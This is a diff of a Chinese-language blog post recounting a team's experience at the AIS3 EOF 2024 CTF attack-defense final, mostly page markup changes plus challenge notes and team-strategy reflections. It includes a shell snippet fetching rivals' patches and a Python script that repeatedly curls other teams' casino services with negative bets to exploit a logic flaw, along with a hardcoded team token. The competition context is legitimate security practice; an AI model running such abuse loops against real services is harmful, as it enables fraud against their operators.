+<div class="code-container" data-rel="Sh"><figure class="iseeu highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">rm</span> file*</span><br><span class="line">wget --header=<span class="string">"Authorization: &lt;team token&gt;"</span> http://35.221.224.244:8888/patch/123/file</span><br><span class="line">zstd -d file -o file.tar</span><br><span class="line">undocker file.tar team3_r89.tar</span><br><span class="line"><span class="built_in">mkdir</span> team3_r89</span><br><span class="line">tar xvf team3_r89.tar -C team3_r89</span><br><span class="line">diff -r src patches/team3_r89/app/src/</span><br></pre></td></tr></table></figure></div>
 
 <p>基本上跟 DEF CON 一樣.</p>
 <p>賽後 maple3142 說這題可以 persist 一直拿 flag, 因為不會被洗掉, 但沒人做.</p>
 <h2 id="Casino-A-D-KoH"><a href="#Casino-A-D-KoH" class="headerlink" title="Casino [A&D / KoH?]"></a>Casino [A&amp;D / KoH?]</h2><p>這題只有幫忙臨時寫 script, 寫的是到別人的賭場賭負數的錢, 大概花了 1~2 分鐘寫好.</p>
-<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_user_token</span>():</span><br><span class="line">    <span class="keyword">import</span> requests</span><br><span class="line">    URL = <span class="string">'http://10.102.100.2:8080/api/roundInfo?team_token=467f2d77f9df424490d15fc05d80774a'</span></span><br><span class="line">    response = requests.get(URL).json()</span><br><span class="line">    <span class="keyword">return</span> response[<span class="string">'user_token'</span>]</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>():</span><br><span class="line">    <span class="keyword">import</span> requests</span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">11</span>):</span><br><span class="line">            user_token = get_user_token()</span><br><span class="line">            <span class="keyword">if</span> i == <span class="number">6</span>: <span class="keyword">continue</span></span><br><span class="line">            <span class="built_in">print</span>(i)</span><br><span class="line">            cmd = <span class="string">'''</span></span><br><span class="line"><span class="string">    curl 'http://10.102.'''</span>+<span class="built_in">str</span>(i)+<span class="string">'''.20:8000/api/start_game' \</span></span><br><span class="line"><span class="string">    -H 'Accept: */*' \</span></span><br><span class="line"><span class="string">    -H 'Accept-Language: zh-TW,zh;q=0.9' \</span></span><br><span class="line"><span class="string">    -H 'Connection: keep-alive' \</span></span><br><span class="line"><span class="string">    -H 'Content-Type: application/json' \</span></span><br><span class="line"><span class="string">    -H 'Cookie: SL_G_WPT_TO=zh-TW; SL_GWPT_Show_Hide_tmp=1; SL_wptGlobTipTmp=1; teamToken=&lt;team token&gt;' \</span></span><br><span class="line"><span class="string">    -H 'DNT: 1' \</span></span><br><span class="line"><span class="string">    -H 'Origin: http://10.102.9.20:8000' \</span></span><br><span class="line"><span class="string">    -H 'Referer: http://10.102.9.20:8000/' \</span></span><br><span class="line"><span class="string">    -H 'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36 Edg/121.0.0.0' \</span></span><br><span class="line"><span class="string">    --data-raw '{"user_token":"'''</span>+user_token+<span class="string">'''","bet":"-10000"}' \</span></span><br><span class="line"><span class="string">    --compressed \</span></span><br><span class="line"><span class="string">    --insecure  '''</span></span><br><span class="line">    </span><br><span class="line">            <span class="built_in">print</span>(cmd)        </span><br><span class="line"></span><br><span class="line">            os.system(cmd)</span><br><span class="line">main()</span><br></pre></td></tr></table></figure></div>
+<div class="code-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_user_token</span>():</span><br><span class="line">    <span class="keyword">import</span> requests</span><br><span class="line">    URL = <span class="string">'http://10.102.100.2:8080/api/roundInfo?team_token=467f2d77f9df424490d15fc05d80774a'</span></span><br><span class="line">    response = requests.get(URL).json()</span><br><span class="line">    <span class="keyword">return</span> response[<span class="string">'user_token'</span>]</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>():</span><br><span class="line">    <span class="keyword">import</span> requests</span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">11</span>):</span><br><span class="line">            user_token = get_user_token()</span><br><span class="line">            <span class="keyword">if</span> i == <span class="number">6</span>: <span class="keyword">continue</span></span><br><span class="line">            <span class="built_in">print</span>(i)</span><br><span class="line">            cmd = <span class="string">'''</span></span><br><span class="line"><span class="string">    curl 'http://10.102.'''</span>+<span class="built_in">str</span>(i)+<span class="string">'''.20:8000/api/start_game' \</span></span><br><span class="line"><span class="string">    -H 'Accept: */*' \</span></span><br><span class="line"><span class="string">    -H 'Accept-Language: zh-TW,zh;q=0.9' \</span></span><br><span class="line"><span class="string">    -H 'Connection: keep-alive' \</span></span><br><span class="line"><span class="string">    -H 'Content-Type: application/json' \</span></span><br><span class="line"><span class="string">    -H 'Cookie: SL_G_WPT_TO=zh-TW; SL_GWPT_Show_Hide_tmp=1; SL_wptGlobTipTmp=1; teamToken=&lt;team token&gt;' \</span></span><br><span class="line"><span class="string">    -H 'DNT: 1' \</span></span><br><span class="line"><span class="string">    -H 'Origin: http://10.102.9.20:8000' \</span></span><br><span class="line"><span class="string">    -H 'Referer: http://10.102.9.20:8000/' \</span></span><br><span class="line"><span class="string">    -H 'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36 Edg/121.0.0.0' \</span></span><br><span class="line"><span class="string">    --data-raw '{"user_token":"'''</span>+user_token+<span class="string">'''","bet":"-10000"}' \</span></span><br><span class="line"><span class="string">    --compressed \</span></span><br><span class="line"><span class="string">    --insecure  '''</span></span><br><span class="line">    </span><br><span class="line">            <span class="built_in">print</span>(cmd)        </span><br><span class="line"></span><br><span class="line">            os.system(cmd)</span><br><span class="line">main()</span><br></pre></td></tr></table></figure></div>
 
 <h2 id="ICPC-KoH"><a href="#ICPC-KoH" class="headerlink" title="ICPC [KoH]"></a>ICPC [KoH]</h2><p>給了競程的題目, 要用 shellcode 解, 像是算 a+b 等於多少、sort 之類的, 可以禁止某些 byte, 基本上這題我沒參與, 這是唯一適合我這隊幾乎全 pwn 組成的題目, 第二天打的很不錯.</p>
 <h2 id="賽前準備"><a href="#賽前準備" class="headerlink" title="賽前準備"></a>賽前準備</h2><p>這次決賽採主辦方讓每個人依出賽排名輪流選隊的方式, 我隊內大概有兩個是認識的, 共有八人, 人數偏多, 大部分都不認識, 所以在團隊運作上有很大的挑戰. 賽前我把隊友聚集起來, 線上討論準備了 attack manager 跟 pcap search 還有各種語言的混淆工具, 也了解了隊友擅長的領域, 大部分隊友都是打 pwn, reverse 跟 crypto 的, 能打 web 的就我跟 ywc 而已. 以這次 EOF 賽後來看, 多一點 web 的人會有利很多. 比賽環境包含 scoreboard 都要透過 jumpbox 連上, 所以請 ywc 在上面用個 VPN server.</p>
@@ -630,11 +735,11 @@ mjx-container[display="true"] + br {
 <p>我決定第一個捨去掉的是 hahamut 這題的人力, 只留半個人顧封包, 事後證實這很正確, 因為沒人打穿. 接著由 Ching367436 一個人負責 popper 這題, 這也為我們賺了很多分, 這題在第二天我們大部分回合都是第一的 king. ICPC 這題則是放剛好夠的人力進去, 其他大部分都放進新的題目.也放了一些人打 Pwn2Own 的 pwn 部分. 第二天午後 casino 這題戰況也陷入膠著, 我請 Wilson 把這題我們放上讓其他隊都無法攻擊的 patch (拉下整個服務, 讓其他隊無法攻擊) 後把人力空出來去打 Pwn2Own.</p>
 <p>經過調整之後, 我們隊在第二天 140 回合附近進入了前三, 可見調整人力配置 (尤其是互相不認識的多人隊伍) 對分數由很大的影響.</p>
 
-        </div>
+		</div>
 
-        
-            <div class="post-copyright-info w-full my-8 px-2 sm:px-6 md:px-8">
-                <div class="article-copyright-info-container">
+		
+		<div class="post-copyright-info w-full my-8 px-2 sm:px-6 md:px-8">
+			<div class="article-copyright-info-container">
     <ul>
         <li><strong>Title:</strong> AIS3 EOF 2024 Final</li>
         <li><strong>Author:</strong> Ching367436</li>
@@ -657,95 +762,89 @@ mjx-container[display="true"] + br {
     </ul>
 </div>
 
-            </div>
-        
+		</div>
+		
 
-        
-            <ul class="post-tags-box text-lg mt-1.5 flex-wrap justify-center flex md:hidden">
-                
-                    <li class="tag-item mx-0.5">
-                        <a href="/tags/ais3/">#ais3</a>&nbsp;
-                    </li>
-                
-                    <li class="tag-item mx-0.5">
-                        <a href="/tags/ctf/">#ctf</a>&nbsp;
-                    </li>
-                
-            </ul>
-        
+		
+		<ul class="post-tags-box text-lg mt-1.5 flex-wrap justify-center flex md:hidden">
+			
+			<li class="tag-item mx-0.5">
+				<a href="/tags/ais3/">#ais3</a>&nbsp;
+			</li>
+			
+			<li class="tag-item mx-0.5">
+				<a href="/tags/ctf/">#ctf</a>&nbsp;
+			</li>
+			
+		</ul>
+		
 
-        
+		
   <div class="recommended-article px-2 sm:px-6 md:px-8">
    <div class="recommended-desktop">
     <div class="recommended-article-header text-xl md:text-3xl font-bold mt-10">
      <i aria-hidden="true"></i><span>推薦閱讀</span>
     </div>
-    <div class="recommended-article-group"><a class="recommended-article-item" href="/ais3-eof-2024-write-up/" title="AIS3 EOF 2024 Write-up" rel="bookmark">
-  <img src="/ais3-eof-2024-write-up/CHIP1_Ch1p1_cHap@_cHaP@_DUBi_DUbi_da8a_d4B@.webp" alt="AIS3 EOF 2024 Write-up" class="!max-w-none">
-  <span class="title">AIS3 EOF 2024 Write-up</span>
-</a><a class="recommended-article-item" href="/ais3-2021-最佳專題/" title="AIS3 2021 最佳專題" rel="bookmark">
+    <div class="recommended-article-group"><a class="recommended-article-item" href="/hitcon-ctf-2025/" title="HITCON CTF 2025" rel="bookmark">
+  <img src="/hitcon-ctf-2025/tree.webp" alt="HITCON CTF 2025" class="!max-w-none">
+  <span class="title">HITCON CTF 2025</span>
+</a><a class="recommended-article-item" href="/ais3-2021-%E6%9C%80%E4%BD%B3%E5%B0%88%E9%A1%8C/" title="AIS3 2021 最佳專題" rel="bookmark">
   <img src="/ais3-2021-最佳專題/Leukocyte-Lab.png" alt="AIS3 2021 最佳專題" class="!max-w-none">
   <span class="title">AIS3 2021 最佳專題</span>
-</a><a class="recommended-article-item" href="/ais3-2022-最佳專題/" title="AIS3 2022 最佳專題" rel="bookmark">
-  <img src="/ais3-2022-最佳專題/ais3-flag.webp" alt="AIS3 2022 最佳專題" class="!max-w-none">
-  <span class="title">AIS3 2022 最佳專題</span>
+</a><a class="recommended-article-item" href="/ais3-eof-2024-write-up/" title="AIS3 EOF 2024 Write-up" rel="bookmark">
+  <img src="/ais3-eof-2024-write-up/CHIP1_Ch1p1_cHap@_cHaP@_DUBi_DUbi_da8a_d4B@.webp" alt="AIS3 EOF 2024 Write-up" class="!max-w-none">
+  <span class="title">AIS3 EOF 2024 Write-up</span>
 </a></div>
    </div>
    <div class="recommended-mobile">
    <div class="recommended-article-header text-xl md:text-3xl font-bold mt-10">
      <i aria-hidden="true"></i><span>推薦閱讀</span>
    </div>
-   <div class="recommended-article-group"><a class="recommended-article-item" href="/ais3-eof-2024-write-up/" title="AIS3 EOF 2024 Write-up" rel="bookmark">
-  <img src="/ais3-eof-2024-write-up/CHIP1_Ch1p1_cHap@_cHaP@_DUBi_DUbi_da8a_d4B@.webp" alt="AIS3 EOF 2024 Write-up" class="!max-w-none">
-  <span class="title">AIS3 EOF 2024 Write-up</span>
-</a><a class="recommended-article-item" href="/ais3-2021-最佳專題/" title="AIS3 2021 最佳專題" rel="bookmark">
+   <div class="recommended-article-group"><a class="recommended-article-item" href="/hitcon-ctf-2025/" title="HITCON CTF 2025" rel="bookmark">
+  <img src="/hitcon-ctf-2025/tree.webp" alt="HITCON CTF 2025" class="!max-w-none">
+  <span class="title">HITCON CTF 2025</span>
+</a><a class="recommended-article-item" href="/ais3-2021-%E6%9C%80%E4%BD%B3%E5%B0%88%E9%A1%8C/" title="AIS3 2021 最佳專題" rel="bookmark">
   <img src="/ais3-2021-最佳專題/Leukocyte-Lab.png" alt="AIS3 2021 最佳專題" class="!max-w-none">
   <span class="title">AIS3 2021 最佳專題</span>
 </a></div>
    </div>
   </div>
 
-        
-            <div class="article-nav my-8 flex justify-between items-center px-2 sm:px-6 md:px-8">
-                
-                    <div class="article-prev border-border-color shadow-redefine-flat shadow-shadow-color-2 rounded-medium px-4 py-2 hover:shadow-redefine-flat-hover hover:shadow-shadow-color-2">
-                        <a class="prev"
-                        rel="prev"
-                        href="/edu-ctf-2022-write-up/"
-                        >
-                            <span class="left arrow-icon flex justify-center items-center">
-                                <i class="fa-solid fa-chevron-left"></i>
-                            </span>
-                            <span class="title flex justify-center items-center">
-                                <span class="post-nav-title-item">EDU CTF 2022 Write-up</span>
-                                <span class="post-nav-item">Prev posts</span>
-                            </span>
-                        </a>
-                    </div>
-                
-                
-                    <div class="article-next border-border-color shadow-redefine-flat shadow-shadow-color-2 rounded-medium px-4 py-2 hover:shadow-redefine-flat-hover hover:shadow-shadow-color-2">
-                        <a class="next"
-                        rel="next"
-                        href="/ais3-eof-2024-write-up/"
-                        >
-                            <span class="title flex justify-center items-center">
-                                <span class="post-nav-title-item">AIS3 EOF 2024 Write-up</span>
-                                <span class="post-nav-item">Next posts</span>
-                            </span>
-                            <span class="right arrow-icon flex justify-center items-center">
-                                <i class="fa-solid fa-chevron-right"></i>
-                            </span>
-                        </a>
-                    </div>
-                
-            </div>
-        
+		
+		<div class="article-nav my-8 flex justify-between items-center px-2 sm:px-6 md:px-8">
+			
+			<div class="article-prev border-border-color shadow-redefine-flat shadow-shadow-color-2 rounded-medium px-4 py-2 hover:shadow-redefine-flat-hover hover:shadow-shadow-color-2">
+				<a class="prev" rel="prev" href="/edu-ctf-2022-write-up/">
+					<span class="left arrow-icon flex justify-center items-center">
+						<i class="fa-solid fa-chevron-left"></i>
+					</span>
+					<span class="title flex justify-center items-center">
+						<span class="post-nav-title-item truncate max-w-48">EDU CTF 2022 Write-up</span>
+						<span class="post-nav-item">Prev posts</span>
+					</span>
+				</a>
+			</div>
+			
+			
+			<div class="article-next border-border-color shadow-redefine-flat shadow-shadow-color-2 rounded-medium px-4 py-2 hover:shadow-redefine-flat-hover hover:shadow-shadow-color-2">
+				<a class="next" rel="next" href="/ais3-eof-2024-write-up/">
+					<span class="title flex justify-center items-center">
+						<span class="post-nav-title-item truncate max-w-48">AIS3 EOF 2024 Write-up</span>
+						<span class="post-nav-item">Next posts</span>
+					</span>
+					<span class="right arrow-icon flex justify-center items-center">
+						<i class="fa-solid fa-chevron-right"></i>
+					</span>
+				</a>
+			</div>
+			
+		</div>
+		
 
 
-        
-            <div class="comment-container px-2 sm:px-6 md:px-8 pb-8">
-                <div class="comments-container mt-10 w-full ">
+		
+		<div class="comment-container px-2 sm:px-6 md:px-8 pb-8">
+			<div class="comments-container mt-10 w-full ">
     <div id="comment-anchor" class="w-full h-2.5"></div>
     <div class="comment-area-title w-full my-1.5 md:my-2.5 text-xl md:text-3xl font-bold">
         Comments
@@ -796,36 +895,30 @@ mjx-container[display="true"] + br {
     
 </div>
 
-            </div>
-        
-    </div>
+		</div>
+		
+	</div>
 
-    
-        <div class="toc-content-container">
-            <div class="post-toc-wrap">
-    <div class="post-toc">
-        <div class="toc-title">On this page</div>
-        <div class="page-title">AIS3 EOF 2024 Final</div>
-        <ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#popper-KoH"><span class="nav-text">popper [KoH]</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E9%A1%8C%E7%9B%AE"><span class="nav-text">題目</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%AF%94%E8%B3%BD%E6%83%85%E6%B3%81"><span class="nav-text">比賽情況</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Pwn2Own"><span class="nav-text">Pwn2Own</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#hahamut-A-D"><span class="nav-text">hahamut [A&amp;D]</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Casino-A-D-KoH"><span class="nav-text">Casino [A&amp;D &#x2F; KoH?]</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#ICPC-KoH"><span class="nav-text">ICPC [KoH]</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E8%B3%BD%E5%89%8D%E6%BA%96%E5%82%99"><span class="nav-text">賽前準備</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%9C%98%E9%9A%8A%E5%88%86%E5%B7%A5-%E2%80%93-%E9%80%99%E6%AC%A1%E6%94%B6%E7%A9%AB%E6%9C%80%E5%A4%9A%E7%9A%84%E5%9C%B0%E6%96%B9"><span class="nav-text">團隊分工 – 這次收穫最多的地方</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E8%AA%BF%E6%95%B4%E9%9A%8A%E4%BC%8D%E9%85%8D%E7%BD%AE%E5%8F%8A%E6%88%B0%E7%95%A5"><span class="nav-text">調整隊伍配置及戰略</span></a></li></ol></li></ol>
+	
+	<div class="toc-content-container">
+		<div class="post-toc-wrap">
+	<div class="post-toc">
+		<div class="toc-title">On this page</div>
+		<div class="page-title">AIS3 EOF 2024 Final</div>
+		<ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#popper-KoH"><span class="nav-text">popper [KoH]</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E9%A1%8C%E7%9B%AE"><span class="nav-text">題目</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%AF%94%E8%B3%BD%E6%83%85%E6%B3%81"><span class="nav-text">比賽情況</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Pwn2Own"><span class="nav-text">Pwn2Own</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#hahamut-A-D"><span class="nav-text">hahamut [A&amp;D]</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Casino-A-D-KoH"><span class="nav-text">Casino [A&amp;D &#x2F; KoH?]</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#ICPC-KoH"><span class="nav-text">ICPC [KoH]</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E8%B3%BD%E5%89%8D%E6%BA%96%E5%82%99"><span class="nav-text">賽前準備</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%9C%98%E9%9A%8A%E5%88%86%E5%B7%A5-%E2%80%93-%E9%80%99%E6%AC%A1%E6%94%B6%E7%A9%AB%E6%9C%80%E5%A4%9A%E7%9A%84%E5%9C%B0%E6%96%B9"><span class="nav-text">團隊分工 – 這次收穫最多的地方</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E8%AA%BF%E6%95%B4%E9%9A%8A%E4%BC%8D%E9%85%8D%E7%BD%AE%E5%8F%8A%E6%88%B0%E7%95%A5"><span class="nav-text">調整隊伍配置及戰略</span></a></li></ol></li></ol>
 
-    </div>
+	</div>
 </div>
-        </div>
-    
+	</div>
+	
 </div>
+			</div>
 
+			
+		</div>
 
-
-                
-
-            </div>
-
-            
-
-        </div>
-
-        <div class="main-content-footer">
-            <footer class="footer mt-5 py-5 h-auto text-base text-third-text-color relative border-t-2 border-t-border-color">
+		<div class="main-content-footer">
+			<footer class="footer mt-5 py-5 h-auto text-base text-third-text-color relative border-t-2 border-t-border-color">
     <div class="info-container py-3 text-center">
         
         <div class="text-center">
@@ -834,16 +927,16 @@ mjx-container[display="true"] + br {
               <span>2023</span>
               -
             
-            2025&nbsp;&nbsp;<i class="fa-solid fa-heart" style="color: #f54545"></i>&nbsp;&nbsp;<a href="/">Ching367436</a>
+            2026&nbsp;&nbsp;<i class="fa-solid fa-heart" style="color: #f54545"></i>&nbsp;&nbsp;<a href="/">Ching367436</a>
             
                 
                 <p class="post-count space-x-0.5">
                     <span>
-                        12 posts in total
+                        14 posts in total
                     </span>
                     
                         <span>
-                            29.8k words in total
+                            34.9k words in total
                         </span>
                     
                 </p>
@@ -852,7 +945,7 @@ mjx-container[display="true"] + br {
         
         <div class="relative text-center lg:absolute lg:left-[20px] lg:top-1/2 lg:-translate-y-1/2 lg:text-left">
             <span class="lg:block text-sm">POWERED BY <?xml version="1.0" encoding="utf-8"?><!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd"><svg class="relative top-[2px] inline-block align-baseline" version="1.1" id="圖層_1" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" x="0px" y="0px" width="1rem" height="1rem" viewBox="0 0 512 512" enable-background="new 0 0 512 512" xml:space="preserve"><path fill="#0E83CD" d="M256.4,25.8l-200,115.5L56,371.5l199.6,114.7l200-115.5l0.4-230.2L256.4,25.8z M349,354.6l-18.4,10.7l-18.6-11V275H200v79.6l-18.4,10.7l-18.6-11v-197l18.5-10.6l18.5,10.8V237h112v-79.6l18.5-10.6l18.5,10.8V354.6z"/></svg><a target="_blank" class="text-base" href="https://hexo.io">Hexo</a></span>
-            <span class="text-sm lg:block">THEME&nbsp;<a class="text-base" target="_blank" href="https://github.com/EvanNotFound/hexo-theme-redefine">Redefine v2.7.1</a></span>
+            <span class="text-sm lg:block">THEME&nbsp;<a class="text-base" target="_blank" href="https://github.com/EvanNotFound/hexo-theme-redefine">Redefine v2.8.5</a></span>
         </div>
         
         
@@ -886,103 +979,97 @@ mjx-container[display="true"] + br {
         
     </div>  
 </footer>
-        </div>
-    </div>
+		</div>
+	</div>
 
-    
-        <div class="post-tools">
-            <div class="post-tools-container">
-    <ul class="article-tools-list">
-        <!-- TOC aside toggle -->
-        
-            <li class="right-bottom-tools page-aside-toggle">
-                <i class="fa-regular fa-outdent"></i>
-            </li>
-        
+	
+	<div class="post-tools">
+		<div class="post-tools-container">
+	<ul class="article-tools-list">
+		<!-- TOC aside toggle -->
+		
+		<li class="right-bottom-tools page-aside-toggle">
+			<i class="fa-regular fa-outdent"></i>
+		</li>
+		
 
-        <!-- go comment -->
-        
-            <li class="go-comment">
-                <i class="fa-regular fa-comments"></i>
-            </li>
-        
-    </ul>
+		<!-- go comment -->
+		
+		<li class="go-comment">
+			<i class="fa-regular fa-comments"></i>
+		</li>
+		
+	</ul>
+</div>
+	</div>
+	
+
+	<div class="right-side-tools-container">
+		<div class="side-tools-container">
+	<ul class="hidden-tools-list">
+		<li class="right-bottom-tools tool-font-adjust-plus flex justify-center items-center">
+			<i class="fa-regular fa-magnifying-glass-plus"></i>
+		</li>
+
+		<li class="right-bottom-tools tool-font-adjust-minus flex justify-center items-center">
+			<i class="fa-regular fa-magnifying-glass-minus"></i>
+		</li>
+
+		<li class="right-bottom-tools tool-dark-light-toggle flex justify-center items-center">
+			<i class="fa-regular fa-moon"></i>
+		</li>
+
+		<!-- rss -->
+		
+		<li class="right-bottom-tools rss flex justify-center items-center">
+			<a class="flex justify-center items-center" href="/atom.xml" target="_blank">
+				<i class="fa-regular fa-rss"></i>
+			</a>
+		</li>
+		
+
+		
+		<li class="right-bottom-tools tool-scroll-to-top flex justify-center items-center">
+			<i class="fa-regular fa-arrow-up"></i>
+		</li>
+		
+
+		<li class="right-bottom-tools tool-scroll-to-bottom flex justify-center items-center">
+			<i class="fa-regular fa-arrow-down"></i>
+		</li>
+	</ul>
+
+	<ul class="visible-tools-list">
+		<li class="right-bottom-tools toggle-tools-list flex justify-center items-center">
+			<i class="fa-regular fa-cog fa-spin"></i>
+		</li>
+		
+		
+	</ul>
+</div>
+	</div>
+
+	<div class="image-viewer-container">
+	<img src="">
 </div>
 
-        </div>
-    
-
-    <div class="right-side-tools-container">
-        <div class="side-tools-container">
-    <ul class="hidden-tools-list">
-        <li class="right-bottom-tools tool-font-adjust-plus flex justify-center items-center">
-            <i class="fa-regular fa-magnifying-glass-plus"></i>
-        </li>
-
-        <li class="right-bottom-tools tool-font-adjust-minus flex justify-center items-center">
-            <i class="fa-regular fa-magnifying-glass-minus"></i>
-        </li>
-
-        <li class="right-bottom-tools tool-dark-light-toggle flex justify-center items-center">
-            <i class="fa-regular fa-moon"></i>
-        </li>
-
-        <!-- rss -->
-        
-            <li class="right-bottom-tools rss flex justify-center items-center">
-                <a class="flex justify-center items-center"
-                   href="/atom.xml"
-                   target="_blank"
-                >
-                <i class="fa-regular fa-rss"></i>
-                </a>
-            </li>
-        
-
-        
-            <li class="right-bottom-tools tool-scroll-to-top flex justify-center items-center">
-                <i class="fa-regular fa-arrow-up"></i>
-            </li>
-        
-
-        <li class="right-bottom-tools tool-scroll-to-bottom flex justify-center items-center">
-            <i class="fa-regular fa-arrow-down"></i>
-        </li>
-    </ul>
-
-    <ul class="visible-tools-list">
-        <li class="right-bottom-tools toggle-tools-list flex justify-center items-center">
-            <i class="fa-regular fa-cog"></i>
-        </li>
-        
-        
-    </ul>
-</div>
-
-    </div>
-
-    <div class="image-viewer-container">
-    <img src="">
-</div>
-
-
-    
+	
 
 </main>
 
 
-    
-<script src="/js/libs/Swup.min.js"></script>
 
-<script src="/js/libs/SwupSlideTheme.min.js"></script>
+<script src="/js/build/libs/Swup.min.js"></script>
 
-<script src="/js/libs/SwupScriptsPlugin.min.js"></script>
+<script src="/js/build/libs/SwupSlideTheme.min.js"></script>
 
-<script src="/js/libs/SwupProgressPlugin.min.js"></script>
+<script src="/js/build/libs/SwupScriptsPlugin.min.js"></script>
 
-<script src="/js/libs/SwupScrollPlugin.min.js"></script>
+<script src="/js/build/libs/SwupProgressPlugin.min.js"></script>
 
-<script src="/js/libs/SwupPreloadPlugin.min.js"></script>
+<script src="/js/build/libs/SwupScrollPlugin.min.js"></script>
+
+<script src="/js/build/libs/SwupPreloadPlugin.min.js"></script>
 
 <script>
     const swup = new Swup({
@@ -1006,29 +1093,27 @@ mjx-container[display="true"] + br {
 
 
 
+	
+<script src="/js/build/tools/imageViewer.js" type="module"></script>
 
+<script src="/js/build/utils.js" type="module"></script>
 
+<script src="/js/build/main.js" type="module"></script>
 
-<script src="/js/tools/imageViewer.js" type="module"></script>
+<script src="/js/build/layouts/navbarShrink.js" type="module"></script>
 
-<script src="/js/utils.js" type="module"></script>
+<script src="/js/build/tools/scrollTopBottom.js" type="module"></script>
 
-<script src="/js/main.js" type="module"></script>
+<script src="/js/build/tools/lightDarkSwitch.js" type="module"></script>
 
-<script src="/js/layouts/navbarShrink.js" type="module"></script>
-
-<script src="/js/tools/scrollTopBottom.js" type="module"></script>
-
-<script src="/js/tools/lightDarkSwitch.js" type="module"></script>
-
-<script src="/js/layouts/categoryList.js" type="module"></script>
+<script src="/js/build/layouts/categoryList.js" type="module"></script>
 
 
 
 
 
     
-<script src="/js/tools/codeBlock.js" type="module"></script>
+<script src="/js/build/tools/codeBlock.js" type="module"></script>
 
 
 
@@ -1036,10 +1121,10 @@ mjx-container[display="true"] + br {
 
 
     
-<script src="/js/tools/runtime.js"></script>
+<script src="/js/build/tools/runtime.js"></script>
 
     
-<script src="/js/libs/odometer.min.js"></script>
+<script src="/js/build/libs/odometer.min.js"></script>
 
     
 <link rel="stylesheet" href="/assets/odometer-theme-minimal.css">
@@ -1048,10 +1133,10 @@ mjx-container[display="true"] + br {
 
 
   
-<script src="/js/libs/Typed.min.js"></script>
+<script src="/js/build/libs/Typed.min.js"></script>
 
   
-<script src="/js/plugins/typed.js" type="module"></script>
+<script src="/js/build/plugins/typed.js" type="module"></script>
 
 
 
@@ -1061,22 +1146,32 @@ mjx-container[display="true"] + br {
 
 
     
-<script src="/js/libs/anime.min.js"></script>
